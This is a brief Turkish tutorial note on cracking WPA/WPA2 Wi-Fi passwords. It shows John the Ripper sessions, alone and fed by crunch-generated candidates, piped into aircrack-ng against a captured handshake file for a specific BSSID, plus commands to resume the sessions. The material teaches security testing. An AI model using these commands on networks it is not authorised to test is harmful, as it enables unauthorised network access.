# Wpa ve Wpa2 İleri Seviye Saldırı

## John the Ripper

- John the Ripper, siber güvenlikte parola/hash güvenliğini test etmek ve zayıf parolaları tespit etmek için kullanılan bir parola kırma aracıdır.
- Hash elde edilir → John the Ripper hash üzerinde parola tahminleri dener → eşleşme bulunursa parola tespit edilir.

- > john --wordlist=wordlist.txt --stdout --session=omer | aircrack-ng -b 94:FE:22:DA:AC:3D handshake-01.cap -w - //Amaç, parola deneme işleminin durumunu bir oturum adı altında tutabilmek ve gerektiğinde bu oturumu yönetebilmek/devam ettirebilmektir.

- > john --restore=omer | aircrack-ng -b 94:FE:22:DA:AC:3D handshake-01.cap -w - // kaldığı yerden devam etmesini sağlar

---

- Büyük kaydedilmeyecek wordlistleri kaydetmeden deneyip kaldığın yerden tekrar başlatmaya olanak sağlar

- > crunch 8 8 | john --stdin --session=omer --stdout | aircrack-ng -b 94:FE:22:DA:AC:3D handshake-01.cap -w -

- > crunch 8 8 | john --restore=omer | aircrack-ng -b 94:FE:22:DA:AC:3D handshake-01.cap -w -
